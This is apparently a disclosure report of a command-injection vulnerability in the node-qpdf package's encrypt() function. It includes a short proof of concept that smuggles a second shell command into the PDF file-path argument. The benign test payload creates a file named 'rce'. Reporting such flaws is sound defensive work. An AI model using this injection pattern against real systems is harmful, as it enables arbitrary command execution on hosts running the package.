| Hi,  We would like to report a potential security vulnerability. The bug is introduced because the package-exported method `encrypt()` fails to sanitize its parameter `input`, which later flows into a sensitive command execution API. As a result, attackers may inject malicious commands once they can specify the input pdf file path.  Here is the proof of concept.  ``` var qpdf = require('node-qpdf');  var options = {     keyLength: 128,     password: 'YOUR_PASSWORD_TO_ENCRYPT' }  qpdf.encrypt('test.pdf ||touch rce||', options); // a file named rce will be created  ``` |
